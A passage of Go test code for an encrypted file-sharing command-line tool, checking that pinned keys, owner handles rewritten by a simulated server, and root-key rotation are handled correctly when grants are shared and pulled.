			if err := app.sharesCmd().RunE(nil, nil); err != nil {
				t.Fatalf("shares: %v", err)
			}
		})
		sender := pinnedLabel("mallory@example.com", fp, false)
		if !strings.Contains(stderr, "aqt://"+id+" is shared by "+sender) || !strings.Contains(shares, "from "+sender) {
			t.Fatalf("pull and shares disagree on the sender %q:\npull: %s\nshares: %s", sender, stderr, shares)
		}
	})
}

// The handle in a pin is half of what it vouches for. Here the server tells alice a
// handle that is not hers, so she signs a share under it, and names that handle as
// the owner when bob reads it. Alice's key signed it, but bob pinned her under her
// real handle, so the share is not hers to him and does not open.
func TestPinnedKeyUnderAnotherHandleNamesNobody(t *testing.T) {
	app := &application{ctx: context.Background()}
	var misfiled atomic.Pointer[grantRead]
	h := app.newE2EWithProxy(t, rewriteGrantRead(&misfiled))
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	id := app.pushSecretFile(t, "notes.txt", "signed under a handle that is not hers")
	cl, alice, err := app.authedClient()
	if err != nil {
		t.Fatal(err)
	}
	aliceKeys, err := fetchAccountKeys(cl, "e2e@example.com")
	if err != nil {
		t.Fatal(err)
	}
	app.asProfile("bob", func() { app.pinVerified(t, "e2e@example.com", aliceKeys) })

	const handle = "not-alices-handle"
	alice.OwnerHandle = handle
	if err := identity.Save(alice); err != nil {
		t.Fatal(err)
	}
	if err := app.runShareWith(id, "bob@example.com"); err != nil {
		t.Fatalf("share --with bob: %v", err)
	}
	misfiled.Store(&grantRead{resourceID: id, rewrite: func(res *api.GetResourceResponse) { res.Owner = handle }})

	app.asGrantee("bob", func() {
		err := app.runPull("aqt://"+id, filepath.Join(t.TempDir(), "notes.txt"), "", false, false)
		if err == nil || !strings.Contains(err.Error(), "not theirs") {
			t.Fatalf("pull of a share alice's key signed under another handle = %v, want a refusal", err)
		}
	})
}

// A root-key rotation replaces the identity key grants are signed with, so it re-signs
// the account's outgoing grants: a recipient checking the key the server now reports
// keeps opening them, and the owner's next key rotation still re-wraps them.
func TestRootRotationResignsOutgoingGrants(t *testing.T) {
	app := &application{ctx: context.Background()}
	h := app.newE2E(t)
	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
	const content = "still readable after the owner rotates"
	id := app.pushSecretFile(t, "resign.txt", content)
	if err := app.runShareWith(id, "bob@example.com"); err != nil {
		t.Fatalf("share --with bob: %v", err)
	}
	withStdin(t, "correct horse battery staple\n")
	if err := app.runRootKeyRotation(true); err != nil {
		t.Fatalf("rotate the owner's root key: %v", err)
	}
	if got := app.pullAs(t, "bob", id); got != content {
		t.Fatalf("bob pulled %q after the owner's root rotation", got)
	}
	if err := app.runPrivate(id, true); err != nil {
		t.Fatalf("rotate the content key: %v", err)
	}
	if got := app.pullAs(t, "bob", id); got != content {
		t.Fatalf("bob pulled %q after the content key rotation", got)
	}
}
